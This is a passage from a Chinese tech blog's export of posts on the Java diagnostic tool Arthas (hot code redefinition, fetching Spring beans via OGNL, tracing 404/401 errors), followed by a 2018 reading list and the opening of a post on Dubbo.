<li><p>使用vim编译代码</p>
<p> 当 user id 小于1时，也正常返回，不抛出异常：</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/user/&#123;id&#125;"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> User <span class="title">findUserById</span><span class="params">(@PathVariable Integer id)</span> </span>&#123;</span><br><span class="line">    logger.info(<span class="string">"id: &#123;&#125;"</span> , id);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (id != <span class="keyword">null</span> &amp;&amp; id &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User(id, <span class="string">"name"</span> + id);</span><br><span class="line">        <span class="comment">// throw new IllegalArgumentException("id &lt; 1");</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User(id, <span class="string">"name"</span> + id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>mc</code>命令编译修改后的<code>UserController.java</code></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mc /tmp/UserController.java -d /tmp</span><br><span class="line">Memory compiler output:</span><br><span class="line">/tmp/com/example/demo/arthas/user/UserController.class</span><br><span class="line">Affect(row-cnt:1) cost <span class="keyword">in</span> 346 ms</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>redefine</code>命令，因为可以热更新代码</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ redefine /tmp/com/example/demo/arthas/user/UserController.class</span><br><span class="line">redefine success, size: 1</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="丝滑的自动补全"><a href="#丝滑的自动补全" class="headerlink" title="丝滑的自动补全"></a>丝滑的自动补全</h3><p>在新版本里，改进了很多命令的自动补全，比如 <code>watch/trace/tt/monitor/stack</code>等。</p>
<p>下面是watch命令的第一个<code>Tab</code>补全结果，用户可以很方便的一步步补全类名，函数名：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ watch</span><br><span class="line">com.   sun.   javax. ch.    io.    demo.  jdk.   org.   java.</span><br></pre></td></tr></table></figure>
<p>另外，新增加了 <code>jad/sc/sm/redefine</code> 等命令的自动补全支持，多按<code>Tab</code>有惊喜。</p>
<h3 id="新版本的Web-console"><a href="#新版本的Web-console" class="headerlink" title="新版本的Web console"></a>新版本的Web console</h3><p>新版本的Web Console切换到了<code>xtermd.js</code>，更好地支持现代浏览器。</p>
<ul>
<li>支持<code>Ctrl + C</code>复制</li>
<li>支持全屏</li>
</ul>
<p><img src="https://alibaba.github.io/arthas/_images/web-console-local.png" alt="web console"></p>
<h3 id="Docker镜像支持"><a href="#Docker镜像支持" class="headerlink" title="Docker镜像支持"></a>Docker镜像支持</h3><p>Arthas支持Docker镜像了</p>
<ul>
<li>用户可以很方便地诊断Docker/k8s里的Java进程</li>
<li>也可以很方便地把Arthas加到自己的基础镜像里</li>
</ul>
<p>参考： <a href="https://alibaba.github.io/arthas/docker.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/docker.html</a></p>
<h3 id="重定向重新设计"><a href="#重定向重新设计" class="headerlink" title="重定向重新设计"></a>重定向重新设计</h3><p>之前的版本里，Arthas的重定向是会放到一个<code>~/logs/arthas-cache/</code>目录里，违反直觉。</p>
<p>在新版本里，重定向和Linux下面的一致，<code>&gt;</code>/<code>&gt;&gt;</code>的行为也和Linux下一致。</p>
<p>并且，增加了 <code>cat</code>/<code>pwd</code>命令，可以配置使用。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总之，<code>3.1.0</code>版本的Arthas带了非常多的新功能，改进了很多的用户体验，欢迎大家使用反馈。</p>
<ul>
<li>Arthas在线教程可以学到很多技巧</li>
<li>jad/mc/redefine 一条龙非常强大</li>
<li>丝滑的自动补全值得尝试</li>
<li>新版本的Web Console有惊奇</li>
</ul>
<p>Release Note: <a href="https://github.com/alibaba/arthas/releases/tag/3.1.0" target="_blank" rel="noopener">https://github.com/alibaba/arthas/releases/tag/3.1.0</a></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>arthas</tag>
        <tag>bytecode</tag>
      </tags>
  </entry>
  <entry>
    <title>Alibaba Arthas实践--获取到Spring Context，然后为所欲为</title>
    <url>/arthas-spring-context/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Arthas 是Alibaba开源的Java诊断工具，深受开发者喜爱。</p>
<ul>
<li><a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener">https://github.com/alibaba/arthas</a></li>
</ul>
<p>Arthas提供了非常丰富的关于调用拦截的命令，比如 trace/watch/monitor/tt 。但是很多时候我们在排查问题时，需要更多的线索，并不只是函数的参数和返回值。<br>比如在一个spring应用里，想获取到spring context里的其它bean。如果能随意获取到spring bean，那就可以“为所欲为”了。</p>
<p>下面介绍如何利用Arthas获取到spring context。</p>
<p>Demo： <a href="https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-arthas-spring-boot" target="_blank" rel="noopener">https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-arthas-spring-boot</a></p>
<p>Arthas快速开始：<a href="https://alibaba.github.io/arthas/quick-start.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/quick-start.html</a></p>
<h2 id="使用tt命令获取到spring-context"><a href="#使用tt命令获取到spring-context" class="headerlink" title="使用tt命令获取到spring context"></a>使用tt命令获取到spring context</h2><p>Demo是一个spring mvc应用，请求会经过一系列的spring bean处理，那么我们可以在spring mvc的类里拦截到一些请求。</p>
<p>启动Demo： <code>mvn spring-boot:run</code></p>
<p>使用Arthas Attach成功之后，执行<code>tt</code>命令来记录<code>RequestMappingHandlerAdapter#invokeHandlerMethod</code>的请求</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tt -t org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter invokeHandlerMethod</span><br></pre></td></tr></table></figure>
<p>然后访问一个网页： <a href="http://localhost:8080/" target="_blank" rel="noopener">http://localhost:8080/</a></p>
<p>可以看到Arthas会拦截到这个调用，index是1000，并且打印出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ watch com.example.demo.Test * <span class="string">'params[0]@sss'</span></span><br><span class="line">$ tt -t org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter invokeHandlerMethod</span><br><span class="line">Press Ctrl+C to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:1) cost <span class="keyword">in</span> 101 ms.</span><br><span class="line"> INDEX  TIMESTAMP         COST(ms  IS-RE  IS-EX  OBJECT       CLASS                     METHOD</span><br><span class="line">                          )        T      P</span><br><span class="line">------------------------------------------------------------------------------------------------------------------</span><br><span class="line"> 1000   2019-01-27 16:31  3.66744  <span class="literal">true</span>   <span class="literal">false</span>  0x4465cf70   RequestMappingHandlerAda  invokeHandlerMethod</span><br><span class="line">        :54                                                   pter</span><br></pre></td></tr></table></figure>
<p><strong>那么怎样获取到spring context？</strong></p>
<p>可以用<code>tt</code>命令的<code>-i</code>参数来指定index，并且用<code>-w</code>参数来执行ognl表达式来获取spring context：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tt -i 1000 -w <span class="string">'target.getApplicationContext()'</span></span><br><span class="line">@AnnotationConfigEmbeddedWebApplicationContext[</span><br><span class="line">    reader=@AnnotatedBeanDefinitionReader[org.springframework.context.annotation.AnnotatedBeanDefinitionReader@35dc90ec],</span><br><span class="line">    scanner=@ClassPathBeanDefinitionScanner[org.springframework.context.annotation.ClassPathBeanDefinitionScanner@72078a14],</span><br><span class="line">    annotatedClasses=null,</span><br><span class="line">    basePackages=null,</span><br><span class="line">]</span><br><span class="line">Affect(row-cnt:1) cost <span class="keyword">in</span> 7 ms.</span><br></pre></td></tr></table></figure>
<h2 id="从spring-context里获取任意bean"><a href="#从spring-context里获取任意bean" class="headerlink" title="从spring context里获取任意bean"></a>从spring context里获取任意bean</h2><p>获取到spring context之后，就可以获取到任意的bean了，比如获取到<code>helloWorldService</code>，并调用<code>getHelloMessage()</code>函数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tt -i 1000 -w <span class="string">'target.getApplicationContext().getBean("helloWorldService").getHelloMessage()'</span></span><br><span class="line">@String[Hello World]</span><br><span class="line">Affect(row-cnt:1) cost <span class="keyword">in</span> 5 ms.</span><br></pre></td></tr></table></figure>
<h2 id="更多的思路"><a href="#更多的思路" class="headerlink" title="更多的思路"></a>更多的思路</h2><p>在很多代码里都有static函数或者static holder类，顺滕摸瓜，可以获取很多其它的对象。比如在Dubbo里通过<code>SpringExtensionFactory</code>获取spring context：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ognl <span class="string">'#context=@com.alibaba.dubbo.config.spring.extension.SpringExtensionFactory@contexts.iterator.next, </span></span><br><span class="line"><span class="string">#context.getBean("userServiceImpl").findUser(1)'</span></span><br><span class="line">@User[</span><br><span class="line">    id=@Integer[1],</span><br><span class="line">    name=@String[Deanna Borer],</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><ul>
<li>Arthas: <a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener">https://github.com/alibaba/arthas</a></li>
<li><a href="https://alibaba.github.io/arthas/tt.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/tt.html</a></li>
<li><a href="https://alibaba.github.io/arthas/ognl.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/ognl.html</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>arthas</tag>
        <tag>spring-boot</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Arthas实践--快速排查Spring Boot应用404/401问题</title>
    <url>/arthas-spring-boot-404-401/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在Java Web/Spring Boot开发时，很常见的问题是：</p>
<ul>
<li>网页访问404了，为什么访问不到？</li>
<li>登陆失败了，请求返回401，到底是哪个Filter拦截了我的请求？</li>
</ul>
<p>碰到这种问题时，通常很头痛，特别是在线上环境时。</p>
<p>本文介绍使用Alibaba开源的Java诊断利器Arthas，来快速定位这类Web请求404/401问题。</p>
<ul>
<li><a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener">https://github.com/alibaba/arthas</a></li>
</ul>
<h2 id="Java-Web里一个请求被处理的流程"><a href="#Java-Web里一个请求被处理的流程" class="headerlink" title="Java Web里一个请求被处理的流程"></a>Java Web里一个请求被处理的流程</h2><p>在进入正题之前，先温习下知识。一个普通的Java Web请求处理流程大概是这样子的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Request  -&gt; Filter1 -&gt; Filter2 ... -&gt; Servlet</span><br><span class="line">                                        |</span><br><span class="line">Response &lt;- Filter1 &lt;- Filter2 ... &lt;- Servlet</span><br></pre></td></tr></table></figure>
<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>本文的介绍基于一个很简单的Demo：<a href="https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-404-401" target="_blank" rel="noopener">https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-404-401</a></p>
<ul>
<li>访问 <a href="http://localhost:8080/" target="_blank" rel="noopener">http://localhost:8080/</a> ，返回200，正常打印Welconme信息</li>
<li>访问 <a href="http://localhost:8080/a.txt" target="_blank" rel="noopener">http://localhost:8080/a.txt</a> ，返回404</li>
<li>访问 <a href="http://localhost:8080/admin" target="_blank" rel="noopener">http://localhost:8080/admin</a> ，返回401</li>
</ul>
<h2 id="是哪个Servlet返回了404？"><a href="#是哪个Servlet返回了404？" class="headerlink" title="是哪个Servlet返回了404？"></a>是哪个Servlet返回了404？</h2><p>Demo启动后，访问：<a href="http://localhost:8080/a.txt" target="_blank" rel="noopener">http://localhost:8080/a.txt</a> ，返回404：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl http://localhost:8080/a.txt</span><br><span class="line">&#123;<span class="string">"timestamp"</span>:1546790485831,<span class="string">"status"</span>:404,<span class="string">"error"</span>:<span class="string">"Not Found"</span>,<span class="string">"message"</span>:<span class="string">"No message available"</span>,<span class="string">"path"</span>:<span class="string">"/a.txt"</span>&#125;</span><br></pre></td></tr></table></figure>
<p><strong>我们知道一个HTTP Request，大部分情况下都是由一个Servlet处理的，那么到底是哪个Servlet返回了404？</strong></p>
<p>我们使用Arthas的<code>trace</code>命令来定位：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ trace javax.servlet.Servlet *</span><br><span class="line">Press Ctrl+C to abort.</span><br><span class="line">Affect(class-cnt:7 , method-cnt:185) cost <span class="keyword">in</span> 1018 ms.</span><br></pre></td></tr></table></figure>
<p>然后访问 <a href="http://localhost:8080/a.txt" target="_blank" rel="noopener">http://localhost:8080/a.txt</a> ，Arthas会打印出整个请求树，完整的输出太长，这里只截取关键的一输出：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">+---[<span class="number">13.087083</span>ms] org.springframework.web.servlet.DispatcherServlet:resolveViewName()</span><br><span class="line">|   `---[<span class="number">13.020984</span>ms] org.springframework.web.servlet.DispatcherServlet:resolveViewName()</span><br><span class="line">|       +---[<span class="number">0.002777</span>ms] java.util.List:iterator()</span><br><span class="line">|       +---[<span class="number">0.001955</span>ms] java.util.Iterator:hasNext()</span><br><span class="line">|       +---[<span class="number">0.001739</span>ms] java.util.Iterator:next()</span><br><span class="line">|       `---[<span class="number">12.891979</span>ms] org.springframework.web.servlet.ViewResolver:resolveViewName()</span><br><span class="line">|           +---[<span class="number">0.089811</span>ms] javax.servlet.GenericServlet:&lt;init&gt;()</span><br><span class="line">|           +---[min=<span class="number">0.037696</span>ms,max=<span class="number">0.054478</span>ms,total=<span class="number">0.092174</span>ms,count=<span class="number">2</span>] org.springframework.web.servlet.view.freemarker.FreeMarkerView$GenericServletAdapter:&lt;init&gt;()</span><br></pre></td></tr></table></figure>
<p>可以看出请求经过Spring MVC的<code>DispatcherServlet</code>处理，最终由<code>ViewResolver</code>分派给<code>FreeMarkerView$GenericServletAdapter</code>处理。所以我们可以知道这个请求最终是被<code>FreeMarker</code>处理的。<br>后面再排查<code>FreeMarker</code>的配置就可以了。</p>
<p>这个神奇的<code>trace javax.servlet.Servlet *</code>到底是怎样工作的呢？</p>
<p>实际上Arthas会匹配到JVM里所有实现了<code>javax.servlet.Servlet</code>的类，然后<code>trace</code>它们的所有函数，所以HTTP请求会被打印出来。</p>
<blockquote>
<p>这里留一个小问题，为什么只访问了<code>http://localhost:8080/a.txt</code>，但Arthas的<code>trace</code>命令打印出了两个请求树？</p>
</blockquote>
<h2 id="是哪个Filter返回了401？"><a href="#是哪个Filter返回了401？" class="headerlink" title="是哪个Filter返回了401？"></a>是哪个Filter返回了401？</h2><p>在Demo里，访问 <a href="http://localhost:8080/admin" target="_blank" rel="noopener">http://localhost:8080/admin</a> ，会返回401，即没有权限。那么是哪个Filter拦截了请求？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl http://localhost:8080/admin</span><br><span class="line">&#123;<span class="string">"timestamp"</span>:1546794743674,<span class="string">"status"</span>:401,<span class="string">"error"</span>:<span class="string">"Unauthorized"</span>,<span class="string">"message"</span>:<span class="string">"admin filter error."</span>,<span class="string">"path"</span>:<span class="string">"/admin"</span>&#125;</span><br></pre></td></tr></table></figure>
<p>我们还是使用Arthas的<code>trace</code>命令来定位，不过这次<code>trace</code>的是<code>javax.servlet.Filter</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ trace javax.servlet.Filter *</span><br><span class="line">Press Ctrl+C to abort.</span><br><span class="line">Affect(class-cnt:13 , method-cnt:75) cost <span class="keyword">in</span> 278 ms.</span><br></pre></td></tr></table></figure>
<p>再次访问admin，在Arthas里，把整个请求经过哪些Filter处理，都打印为树。这里截取关键部分：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">+---[<span class="number">0.704625</span>ms] org.springframework.web.filter.OncePerRequestFilter:doFilterInternal()</span><br><span class="line">|   `---[<span class="number">0.60387</span>ms] org.springframework.web.filter.RequestContextFilter:doFilterInternal()</span><br><span class="line">|       +---[<span class="number">0.022704</span>ms] org.springframework.web.context.request.ServletRequestAttributes:&lt;init&gt;()</span><br><span class="line">|       +---[<span class="number">0.217636</span>ms] org.springframework.web.filter.RequestContextFilter:initContextHolders()</span><br><span class="line">|       |   `---[<span class="number">0.180323</span>ms] org.springframework.web.filter.RequestContextFilter:initContextHolders()</span><br><span class="line">|       |       +---[<span class="number">0.034656</span>ms] javax.servlet.http.HttpServletRequest:getLocale()</span><br><span class="line">|       |       +---[<span class="number">0.0311</span>ms] org.springframework.context.i18n.LocaleContextHolder:setLocale()</span><br><span class="line">|       |       +---[<span class="number">0.008691</span>ms] org.springframework.web.context.request.RequestContextHolder:setRequestAttributes()</span><br><span class="line">|       |       `---[<span class="number">0.014918</span>ms] org.apache.commons.logging.Log:isDebugEnabled()</span><br><span class="line">|       +---[<span class="number">0.215481</span>ms] javax.servlet.FilterChain:doFilter()</span><br><span class="line">|       |   `---[<span class="number">0.072186</span>ms] com.example.demo404401.AdminFilterConfig$AdminFilter:doFilter()</span><br><span class="line">|       |       `---[<span class="number">0.021945</span>ms] javax.servlet.http.HttpServletResponse:sendError()</span><br></pre></td></tr></table></figure>
<p>可以看到HTTP Request最终是被<code>com.example.demo404401.AdminFilterConfig$AdminFilter</code>处理的。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>通过trace Servlet/Filter，可以快速定位Java Web问题</li>
<li>trace是了解应用执行流程的利器，只要trace到关键的接口或者类上</li>
<li>仔细观察trace的结果，可以学习到Spring MVC是处理Web请求细节</li>
</ul>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><ul>
<li><a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener">https://github.com/alibaba/arthas</a></li>
<li><a href="https://alibaba.github.io/arthas/trace.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/trace.html</a></li>
</ul>
<p>打个广告，Arthas正在征集使用者，您的使用是对我们最大的支持。<br>如果Arthas对您排查问题有帮助，请到这个Issue登记下，并在30分钟内成为Arthas Contributor：</p>
<p><a href="https://github.com/alibaba/arthas/issues/395" target="_blank" rel="noopener">https://github.com/alibaba/arthas/issues/395</a> </p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>arthas</tag>
        <tag>trace</tag>
        <tag>spring-boot</tag>
      </tags>
  </entry>
  <entry>
    <title>2018读书总结</title>
    <url>/reading-notes-2018/</url>
    <content><![CDATA[<h2 id="赋能：打造应对不确定性的敏捷团队"><a href="#赋能：打造应对不确定性的敏捷团队" class="headerlink" title="赋能：打造应对不确定性的敏捷团队"></a>赋能：打造应对不确定性的敏捷团队</h2><p><a href="https://book.douban.com/subject/27204181/" target="_blank" rel="noopener">https://book.douban.com/subject/27204181/</a></p>
<p>赋能，这个词经常听到，但不知道是啥意思。看了这本书，算是理解到了。</p>
<p>这本书讲的是在美国特种部队，在伊拉克应对各种“不确定性”事件，不得不把信息公开透明化，加强互动，从而提高应对速度和能力，打造应对不确定性的敏捷团队的故事。</p>
<p>在公司里，很多时候都是各种小团体，软件开发也是各种小群讨论。同一个大部门里，不同的组件都要互相打架。</p>
<p>感觉大部分人并没有意识到事情要公开，信息要流动，事情才能做好。也许是KPI导向的结果，也许是缺少共同目标，每个人都管自己的一亩三分地。</p>
<p>我个人感受是，尽量获取不同部门，不同组件的信息，把解决问题的过程记录下来，并公开化。</p>
<h2 id="美国大城市的死与生"><a href="#美国大城市的死与生" class="headerlink" title="美国大城市的死与生"></a>美国大城市的死与生</h2><p><a href="https://book.douban.com/subject/1870268/" target="_blank" rel="noopener">https://book.douban.com/subject/1870268/</a></p>
<p>这本书很早就知道了，但没有动机去看。真正起了兴趣去看，是因为看到一位美国留学生的Blog，里面提到了各种街区。所以去看了这本书。</p>
<p>感觉中国的城市设计者们受这本书的影响很深，城市基本都是混合功能的，并没有像美国那样子整齐的街区划分。之前还有传言说要把小区的墙都拆掉。</p>
<p>这本书是1961年出版的，所以我很好奇这本书到底在美国产生了怎样的影响。后面在《规模》里找到了一些答案。</p>
<p>这本书只看了三分之二，因为翻译真的不好。</p>
<p>也许中国人不能真正理解美国的街区，正如美国人不能理解中国人的户口。</p>
<h2 id="规模：复杂世界的简单法则"><a href="#规模：复杂世界的简单法则" class="headerlink" title="规模：复杂世界的简单法则"></a>规模：复杂世界的简单法则</h2><p><a href="https://book.douban.com/subject/30244461/" target="_blank" rel="noopener">https://book.douban.com/subject/30244461/</a></p>
<p>推荐。这本书是同事推荐的，里面谈的都是事物上了规模之后的一些统计学规律。看了可能有点沮丧，人逃脱不了这些规律。</p>
<p>不过看了这本书，明白了一个事情：城市化是不可逆转的，超大规模的城市群会越来越多。</p>
<p>书里提到很多《美国大城市的死与生》给美国人的影响。读书有乐趣的一点就是，两本书的互相印证。</p>
<h2 id="新教伦理与资本主义精神"><a href="#新教伦理与资本主义精神" class="headerlink" title="新教伦理与资本主义精神"></a>新教伦理与资本主义精神</h2><p><a href="https://book.douban.com/subject/6436046/" target="_blank" rel="noopener">https://book.douban.com/subject/6436046/</a></p>
<p>推荐。这本书说的是新教怎么影响资本主义的。翻译的版本里有一些很不错的配图，导致我一开始以为是80/90年代的书，但看到中间时，感觉不太对，去查了下，发现是1905年出版的，十分惊讶。</p>
<p>无论这本书是否是给资本主义正名，但里面提到的一点比较有意思：新教的禁欲主义使得新教徒很勤奋，所以他们资本财富不断增加。但财富增长到一定程度之后，这种宗教的精神慢慢泯灭了。这点和现在的中国很像，70/80还比较能体会到艰苦奋斗，90/00对艰苦奋斗这种概念已经很淡薄了。日本也曾经如此。</p>
<p>还有一点，现代人可能不太能理解为什么当时的人对资本主义深恶痛绝。在《众病之王：癌症传》里提到有一种消失了的癌症：阴囊癌。18世纪的很多童工因为身体接触到这些煤烟而患上阴囊癌。一开始是立法禁止8岁以下儿童，后面才逐步完全禁止。</p>
<p>有关联的一本书：《非理性的人》，在看中，推荐。</p>
<h2 id="见识：商业的本质和人生的智慧"><a href="#见识：商业的本质和人生的智慧" class="headerlink" title="见识：商业的本质和人生的智慧"></a>见识：商业的本质和人生的智慧</h2><p><a href="https://book.douban.com/subject/27167992/" target="_blank" rel="noopener">https://book.douban.com/subject/27167992/</a></p>
<p>推荐。这本书里学到了一个观点：让用户充值不重要，重要的是要让用户花出去。</p>
<h2 id="死人经"><a href="#死人经" class="headerlink" title="死人经"></a>死人经</h2><p><a href="https://book.douban.com/subject/26365250/" target="_blank" rel="noopener">https://book.douban.com/subject/26365250/</a></p>
<p>一般，武侠小说，只看了不到一半，太啰嗦了。</p>
<h2 id="高山下的花环"><a href="#高山下的花环" class="headerlink" title="高山下的花环"></a>高山下的花环</h2><p><a href="https://book.douban.com/subject/2159124/" target="_blank" rel="noopener">https://book.douban.com/subject/2159124/</a></p>
<p>很有时代特征，可以看到很多细节。但是都没有写到位。军队的腐败也只能带一下。现在的人对越战有认知的很少，希望未来可以有对越战争的电影。</p>
<h2 id="搞懂金融的第一本书"><a href="#搞懂金融的第一本书" class="headerlink" title="搞懂金融的第一本书"></a>搞懂金融的第一本书</h2><p><a href="https://book.douban.com/subject/10434287/" target="_blank" rel="noopener">https://book.douban.com/subject/10434287/</a></p>
<p>对小白来说，比较有意思。学到了点通货膨胀，钱币贬值的知识，不过现在已忘记了，哈哈。</p>
<h2 id="你一生的故事"><a href="#你一生的故事" class="headerlink" title="你一生的故事"></a>你一生的故事</h2><p><a href="https://book.douban.com/subject/26295448/" target="_blank" rel="noopener">https://book.douban.com/subject/26295448/</a></p>
<p>因为《降临》电影不知所云，找的原著来看。书是由多个小故事组成的，只看了两个故事：《你一生的故事》和《巴比伦塔》。太多宗教色彩了，提不起兴趣再看。</p>
<h2 id="断舍离"><a href="#断舍离" class="headerlink" title="断舍离"></a>断舍离</h2><p><a href="https://book.douban.com/subject/24749465/" target="_blank" rel="noopener">https://book.douban.com/subject/24749465/</a></p>
<p>囤积物品是人进化的天性，丢掉旧东西，也许是现代人的一种解脱方式。今年搬了一次家，把一些两三年都没用过的东西丢了，感觉有点爽。</p>
<p>还有一个关联的日剧《我的家里空无一物》，看了一两集，没追。</p>
<h2 id="沉默的大多数"><a href="#沉默的大多数" class="headerlink" title="沉默的大多数"></a>沉默的大多数</h2><p><a href="https://book.douban.com/subject/1054685/" target="_blank" rel="noopener">https://book.douban.com/subject/1054685/</a> </p>
<p>王小波的杂文集。王小波的小说一直没有看进去，偶然看到这本杂文还挺有意思的。</p>
<h2 id="黑色皮革手册"><a href="#黑色皮革手册" class="headerlink" title="黑色皮革手册"></a>黑色皮革手册</h2><p><a href="https://book.douban.com/subject/26301856/" target="_blank" rel="noopener">https://book.douban.com/subject/26301856/</a></p>
<p>因为同名日剧去看的，日剧本身没看，直接看的小说，还行。</p>
<h2 id="对于历史，科学家有话说"><a href="#对于历史，科学家有话说" class="headerlink" title="对于历史，科学家有话说"></a>对于历史，科学家有话说</h2><p><a href="https://book.douban.com/subject/26954748/" target="_blank" rel="noopener">https://book.douban.com/subject/26954748/</a></p>
<p>了解一些“知识分子”的历史，书里都是当事人的访谈。“知识分子”这个词，对于年青人是比较陌生的，没有经历过的人，可能真的没办法理解。</p>
<h2 id="青年们，读马克思吧！"><a href="#青年们，读马克思吧！" class="headerlink" title="青年们，读马克思吧！"></a>青年们，读马克思吧！</h2><p><a href="https://book.douban.com/subject/25728591/" target="_blank" rel="noopener">https://book.douban.com/subject/25728591/</a></p>
<p>日本人写的，怎样读马克思的书。感觉有点神奇。通过两个作者的书信来往，想讨论马克思是怎样思考的，马克思的方法论。</p>
<h2 id="笑傲江湖-和-倚天屠龙记"><a href="#笑傲江湖-和-倚天屠龙记" class="headerlink" title="笑傲江湖 和 倚天屠龙记"></a>笑傲江湖 和 倚天屠龙记</h2><p>金庸去世，把《笑傲江湖》和《倚天屠龙记》重新看了一遍。 为什么这两本呢？因为小学的时候，从角落里翻到《笑傲江湖》的第二本，《倚天屠龙记》的第一本。当时看完了又找不到后续，只能翻来覆去的看了好几遍。直到上高中，从图书馆借书才看了完本。</p>
<p>《笑傲江湖》有个点很有意思，岳不群和左冷禅争五岳盟主时，岳不群说：“只须方针一变，天下同道协力以赴，期之以五十年、一百年，决无不成之理。”金庸在后记里专门说明小说是早年写的，并非影射。不管真相是怎样，看到还是觉得挻搞笑的。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>2018年把今日头条卸载了，因为推的内容越来越单一，越来越八卦。发现这些软件都没有重置的功能，应该允许用户重新选择感兴趣的内容，重新开始推荐。大数据时代，每个人都只能看到自己圈子里的，越来越难看到另外领域的信息了。</p>
<p>五星推荐：</p>
<ul>
<li>赋能：打造应对不确定性的敏捷团队</li>
<li>规模：复杂世界的简单法则</li>
<li>新教伦理与资本主义精神</li>
<li>见识：商业的本质和人生的智慧</li>
</ul>
]]></content>
      <categories>
        <category>读书</category>
      </categories>
      <tags>
        <tag>读书</tag>
      </tags>
  </entry>
  <entry>
    <title>当Dubbo遇上Arthas：排查问题的实践</title>
    <url>/dubbo-meet-arthas/</url>
    <content><![CDATA[<p>Apache Dubbo是Alibaba开源的高性能RPC框架，在国内有非常多的用户。</p>
<ul>
<li>Github: <a href="https://github.com/apache/incubator-dubbo" target="_blank" rel="noopener">https://github.com/apache/incubator-dubbo</a></li>
<li>文档：<a href="http://dubbo.incubator.apache.org/zh-cn/" target="_blank" rel="noopener">http://dubbo.incubator.apache.org/zh-cn/</a></li>
</ul>
<p>Arthas是Alibaba开源的应用诊断利器，9月份开源以来，Github Star数三个月超过6000。</p>
<ul>
<li>Github: <a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener">https://github.com/alibaba/arthas</a></li>
<li>文档：<a href="https://alibaba.github.io/arthas/" target="_blank" rel="noopener">https://alibaba.github.io/arthas/</a></li>
<li>Arthas开源交流QQ群: 916328269</li>
<li>Arthas开源交流钉钉群: 21965291</li>
</ul>
<p>当Dubbo遇上Arthas，会碰撞出什么样的火花呢？下面来分享Arthas排查Dubbo问题的一些经验。</p>
<h3 id="dubbo-arthas-demo"><a href="#dubbo-arthas-demo" class="headerlink" title="dubbo-arthas-demo"></a>dubbo-arthas-demo</h3><p>下面的排查分享基于这个<code>dubbo-arthas-demo</code>，非常简单的一个应用，浏览器请求从Spring MVC到Dubbo Client，再发送到Dubbo Server。</p>
<p>Demo里有两个spring boot应用，可以先启动<code>server-demo</code>，再启动<code>client-demo</code>。</p>
<ul>
<li><a href="https://github.com/hengyunabc/dubbo-arthas-demo" target="_blank" rel="noopener">https://github.com/hengyunabc/dubbo-arthas-demo</a></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/user/&#123;id&#125;    -&gt;   UserService    -&gt;   UserServiceImpl </span><br><span class="line"> Browser           Dubbo Client          Dubbo Server</span><br></pre></td></tr></table></figure>
<p>Client端：</p>
